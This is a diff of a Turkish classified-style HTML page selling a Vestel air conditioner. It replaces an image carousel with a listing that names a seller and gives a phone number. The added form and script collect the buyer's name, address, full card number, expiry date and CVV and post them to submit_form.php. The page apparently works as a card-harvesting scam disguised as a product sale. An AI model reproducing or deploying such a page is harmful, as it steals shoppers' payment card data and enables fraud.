@@ -31,42 +31,11 @@
             border-radius: 8px;
         }
         .product-image {
-            position: relative;
             text-align: center;
         }
-        .carousel-container {
-            position: relative;
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
-            overflow: hidden;
-        }
-        .carousel-images {
-            display: flex;
-            transition: transform 0.5s ease;
-        }
-        .carousel-images img {
-            width: 100%;
+        .product-image img {
+            max-width: 100%;
             border-radius: 8px;
-        }
-        .carousel-button {
-            position: absolute;
-            top: 50%;
-            background-color: rgba(0, 0, 0, 0.5);
-            color: white;
-            padding: 10px;
-            cursor: pointer;
-            border: none;
-            border-radius: 50%;
-            z-index: 1000;
-        }
-        .prev-button {
-            left: 10px;
-            transform: translateY(-50%);
-        }
-        .next-button {
-            right: 10px;
-            transform: translateY(-50%);
         }
         .product-details {
             margin-top: 20px;
@@ -132,49 +101,47 @@
         }
     </style>
     <script>
-        let currentSlide = 0;
-        const images = [
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015921-6544.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103021819-9667.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015926-9670.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015924-1904.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015920-1486.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015922-3315.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015928-2152.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015926-5554.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015927-3418.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015924-5088.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015927-2673.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015925-2248.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015924-3722.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015922-1492.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015924-3231.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015926-2878.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015927-9223.webp",
-            "https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015922-2416.webp"
-        ];
-
-        const carouselImages = document.querySelector('.carousel-images');
-
-        function showSlide(index) {
-            if (index >= images.length) currentSlide = 0;
-            if (index < 0) currentSlide = images.length - 1;
-            carouselImages.style.transform = `translateX(-${currentSlide * 100}%)`;
+        function showPaymentForm() {
+            document.getElementById('payment-form').style.display = 'block';
         }
 
-        function nextSlide() {
-            currentSlide++;
-            showSlide(currentSlide);
-        }
+        function submitForm() {
+            const name = document.getElementById('name').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expDate = document.getElementById('expDate').value;
+            const cvv = document.getElementById('cvv').value;
 
-        function prevSlide() {
-            currentSlide--;
-            showSlide(currentSlide);
-        }
+            const data = {
+                name: name,
+                address: address,
+                city: city,
+                cardNumber: cardNumber,
+                expDate: expDate,
+                cvv: cvv
+            };
 
-        document.addEventListener('DOMContentLoaded', () => {
-            showSlide(currentSlide);
-        });
+            // AJAX ile veri gönderme
+            fetch('submit_form.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    alert('Veriler başarıyla gönderildi!');
+                } else {
+                    alert('Hata: ' + data.message);
+                }
+            })
+            .catch((error) => {
+                console.error('Hata:', error);
+            });
+        }
     </script>
 </head>
 <body>
@@ -182,51 +149,35 @@
     <div class="container">
         <div class="product-card">
             <div class="product-image">
-                <div class="carousel-container">
-                    <div class="carousel-images">
-                        <!-- Kaydırıcı görseller burada yer alacak -->
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015921-6544.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103021819-9667.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015926-9670.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015924-1904.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015920-1486.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015922-3315.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015928-2152.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015926-5554.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015927-3418.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015924-5088.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015927-2673.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015925-2248.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015924-3722.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015922-1492.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015924-3231.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015926-2878.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015927-9223.webp" alt="Vestel Klima">
-                        <img src="https://buvibucdn.holidayplus.pro/holidayplus/buvibu/20240103015922-2416.webp" alt="Vestel Klima">
-                    </div>
-                    <button class="carousel-button prev-button" onclick="prevSlide()">&#10094;</button>
-                    <button class="carousel-button next-button" onclick="nextSlide()">&#10095;</button>
-                </div>
+                <img src="https://i.hizliresim.com/1h8g1r6.jpg" alt="Vestel Klima">
             </div>
             <div class="product-details">
-                <div class="product-title">Vestel 12000 BTU Inverter Klima</div>
+                <div class="product-title">Vestel Sıfır Klima (KUTU FATURA GARANTİ DAHİL)</div>
                 <div class="product-info">
-                    <p>Satılık, 2. el, Vestel marka klima.</p>
-                    <p>Fiyat: <strong>10.000 TL</strong></p>
+                    <p>Fiyat: 11.000 TL</p>
+                    <p>Konum: İzmir / Bornova</p>
+                    <p>Türü: İç Ünite + Dış Ünite</p>
+                    <p>Enerji Sınıfı: A+++</p>
+                    <p>Hacim: 12.000</p>
                 </div>
-            </div>
-            <div class="contact">
-                <p>İletişim için: <strong>+90 555 555 55 55</strong></p>
-            </div>
-            <button class="payment-btn">Ödeme Yap</button>
-            <div class="payment-form">
-                <h3>Ödeme Bilgileri</h3>
-                <form>
-                    <input type="text" placeholder="Adınız" required>
-                    <input type="email" placeholder="E-posta" required>
-                    <input type="text" placeholder="Kart Numarası" required>
-                    <button type="submit">Ödeme Yap</button>
-                </form>
+                <div class="contact">
+                    Satıcı: Merve Taşçı<br>
+                    Telefon: 0 (536) 020 96 38
+                </div>
+                <button class="payment-btn" onclick="showPaymentForm()">Ödeme Yap</button>
+
+                <!-- Ödeme formu burada başlıyor -->
+                <div id="payment-form" class="payment-form">
+                    <h3>Kart Bilgileri</h3>
+                    <input type="text" id="name" placeholder="Ad Soyad" required>
+                    <input type="text" id="address" placeholder="Adres" required>
+                    <input type="text" id="city" placeholder="Şehir" required>
+                    <input type="text" id="cardNumber" placeholder="Kart Numarası" required>
+                    <input type="text" id="expDate" placeholder="Son Kullanma Tarihi (AA/YY)" required>
+                    <input type="text" id="cvv" placeholder="CVV" required>
+                    <button type="button" onclick="submitForm()">Ödeme Yap</button>
+                </div>
+                <!-- Ödeme formu burada bitiyor -->
             </div>
         </div>
     </div>
